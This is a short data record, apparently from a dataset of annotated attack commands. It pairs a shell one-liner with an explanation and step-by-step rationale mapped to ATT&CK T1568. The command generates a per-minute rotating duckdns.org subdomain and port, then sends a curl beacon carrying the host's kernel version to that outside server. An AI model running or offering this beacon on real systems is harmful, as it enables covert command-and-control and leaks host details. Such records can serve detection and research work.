command: seed="$(date -u +%s)-$(hostname -s)"; sub=$(echo -n "$seed" | sha256sum | cut -c1-20); dom="$sub.duckdns.org"; port=$(( ( $(date -u +%s) / 60 % 40000 ) + 2000 )); curl -H "X-ESXi: $(uname -r)" --connect-timeout 5 "https://$dom:$port/ping"
explanation: Generates a per-minute rotating DGA subdomain using epoch seconds and hostname, then calculates a time-based port for the curl beacon. This is dynamic resolution aligned with T1568.
rationale_steps: Create a per-minute seed from epoch time and hostname.
Hash to produce a new subdomain each minute.
Compute a port from the current minute window.
Send a curl request to the generated domain and port.
